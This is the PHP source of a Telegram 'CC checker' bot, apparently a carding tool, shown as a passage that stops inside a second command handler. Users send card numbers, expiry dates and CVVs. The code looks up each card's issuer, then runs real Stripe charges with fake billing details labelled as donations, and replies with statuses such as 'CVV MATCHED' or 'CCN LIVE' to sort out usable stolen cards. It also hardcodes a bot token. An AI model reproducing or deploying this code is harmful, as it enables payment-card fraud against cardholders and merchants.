<?php

////////////////=============[NTM CC BOT]=============////////////////
$botToken = "5486232252:AAH7Jr0xH7gJpD5Obgavh-8EY8AgfBAHXdk"; // Enter ur bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$lastname = $update["message"]["from"]["last_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];
$premiums = file_get_contents('users.txt');
$premium = explode("\n", $premiums);
$group = file_get_contents('groups.txt');
$groups = explode("\n", $group);
if($userId == '803003146') {
$usernam = ''.$username.' 『 𝘿𝙀𝙑 』';
}
elseif($userId == '1438079488') {
        $usernam = ''.$username. ' 『 𝘾𝙤-𝙊𝙬𝙣𝙚𝙧 』';
}
else {
$usernam = $username. '『 𝙁𝙍𝙀𝙀 』';
}
$sk=sk-key;
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
function random_strings($length_of_string) 
{
    $str_result = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; 
    return substr(str_shuffle($str_result),  
                       0, $length_of_string); 
}
$mail = '【🅽🆃🅼】mittal'.random_strings(6).'';
//////////=========[Start Command]=========//////////


if ((strpos($message, "/info") === 0)||(strpos($message, "!run") === 0)||(strpos($message, "!id") === 0)||(strpos($message, "!info") === 0)||(strpos($message, "/id") === 0)||(strpos($message, "/me") === 0)||(strpos($message, "/start") === 0)){
        sendMessage($chatId, "<b>%0A╔═══════════════════%0A╟➣𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐈𝐃 ➣</b> <code>$userId</code>%0A<b>╟═══════════════════%0A╟➣𝐆𝐫𝐨𝐮𝐩 𝐈𝐃 ➣ </b><code>$chatId</code>%0A<b>╟═══════════════════%0A╟➣ 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞 ➣</b> @$username%0A<b>╟═══════════════════%0A╟➣𝐓𝐨 𝐊𝐧𝐨𝐰 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 ➣ /cmds%0A╚═══════════════════</b>", $message_id);
        }
        elseif ((strpos($message, "/chk") === 0)||(strpos($message, "!chk") === 0)||(strpos($message, "!ch") === 0)||(strpos($message, "/ch") === 0)||(strpos($message, ".ch") === 0)||(strpos($message, "!usd") === 0)||(strpos($message, "/usd") === 0)||(strpos($message, ".usd") === 0)||(strpos($message, ".chk") === 0)){
        $message = substr($message, 4);
        $amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
        $cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
        $mes = multiexplode(array(":", "/", " ", "|"), $message)[2];
        $ano = multiexplode(array(":", "/", " ", "|"), $message)[3];
        $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
        if (empty($amt)) {
        $amt = '1';
        }
                $amount = $amt * 100;
                $lista = ''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'';
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Host: lookup.binlist.net',
                'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, '');
                $fim = curl_exec($ch);
                $bank = GetStr($fim, '"bank":{"name":"', '"');
                $name = GetStr($fim, '"name":"', '"');
                $brand = GetStr($fim, '"brand":"', '"');
                $country = GetStr($fim, '"country":{"name":"', '"');
                $emoji = GetStr($fim, '"emoji":"', '"');
                $scheme = GetStr($fim, '"scheme":"', '"');
                $info = curl_getinfo($ch);
                $time = $info['total_time'];
                $httpCode = $info['http_code'];
                 $time = substr($time, 0, 4);
                $type = GetStr($fim, '"type":"', '"');
                if(strpos($fim, '"type":"credit"') !== false){
                $bin = 'Credit';
                }else{
                $bin = 'Debit';
                };
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&billing_details[address][line1]=36&billing_details[address][line2]=Regent Street&billing_details[address][city]=Jamestown&billing_details[address][postal_code]=14701&billing_details[address][state]=New York&billing_details[address][country]=US&billing_details[email]='.$mail.'@gmail.com&billing_details[name]=【🅽🆃🅼】@NTMchat Mittal');
                $result1 = curl_exec($ch);
                $tok1 = Getstr($result1,'"id": "','"');
                $msg1 = Getstr($result1,'"message": "','"');
                $ch = curl_init();
                $info = curl_getinfo($ch);
                $time = $info['total_time'];
                $httpCode = $info['http_code'];
                 $time = substr($time, 0, 4);
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amount.'&currency=usd&payment_method_types[]=card&description=【🅽🆃🅼】@NTMchat Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
                $result2 = curl_exec($ch);
                $info = curl_getinfo($ch);
                $time = $info['total_time'];
                $httpCode = $info['http_code'];
                 $time = substr($time, 0, 4);
                $msg2 = Getstr($result2,'"message": "','"');
                $rcp = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));
                if(strpos($result2, '"seller_message": "Payment complete."' )) {
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣ 『 ★ CVV MATCHED ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Successfully Charged $$amt ✅</b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
        
                }
                elseif(strpos($result2, "insufficient_funds" )) {
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CVV MATCHED ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Insufficient Funds</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "<b>𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CVV MATCHED ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  3D 𝘾𝙖𝙧𝙙</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A╟═══════════════════%0A╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣ <b>'.$time.'s</b>%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif(strpos($result2,'"cvc_check": "pass"')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CVV MATCHED ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Payment Cannot Be Completed</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif(strpos($result2,'"code": "incorrect_cvc"')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CCN LIVE ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  CVV MISSMATCH</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt</b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif(strpos($result1,'"code": "incorrect_cvc"')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CCN LIVE ✅ ★ </b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  CVV MISSMATCH</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, "transaction_not_allowed")) || (strpos($result2, "transaction_not_allowed"))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CVV MATCHED ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Transaction Not Allowed</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt</b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, "fraudulent")) || (strpos($result2, "fraudulent"))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  Fraudulent</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, "expired_card")) || (strpos($result2, "expired_card"))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  Expired 𝘾𝙖𝙧𝙙</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, "generic_declined")) || (strpos($result2, "generic_declined"))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  Generic Declined</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
                }
                elseif ((strpos($result1, "do_not_honor")) || (strpos($result2, "do_not_honor"))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  Do Not Honor</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, 'rate_limit')) || (strpos($result2, 'rate_limit'))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  SK IS AT RATE LIMIT</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                
                elseif ((strpos($result1, "Your card was declined.")) || (strpos($result2, "Your card was declined."))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  Generic Declined</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result2, ' "message": "Your card number is incorrect."'))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  𝘾𝙖𝙧𝙙 Number Is Incorrect</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐀𝐊𝐄𝐍 ➣</b> <b>$time s</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                else {
                sendMessage($chatId, "<b><u><i>Unknown Error. $msg1 - $msg2</i></u></b>", $message_id);
                };
                }
                
                elseif ((strpos($message, "/inr") === 0)||(strpos($message, "!inr") === 0)||(strpos($message, ".inr") === 0)){
        $message = substr($message, 4);
        $amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
        $cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
        $mes = multiexplode(array(":", "/", " ", "|"), $message)[2];
        $ano = multiexplode(array(":", "/", " ", "|"), $message)[3];
        $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
        if (empty($amt)) {
        $amt = '100';
        }
                $amount = $amt * 100;
                $lista = ''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'';
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Host: lookup.binlist.net',
                'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, '');
                $fim = curl_exec($ch);
                $bank = GetStr($fim, '"bank":{"name":"', '"');
                $name = GetStr($fim, '"name":"', '"');
                $brand = GetStr($fim, '"brand":"', '"');
                $country = GetStr($fim, '"country":{"name":"', '"');
                $emoji = GetStr($fim, '"emoji":"', '"');
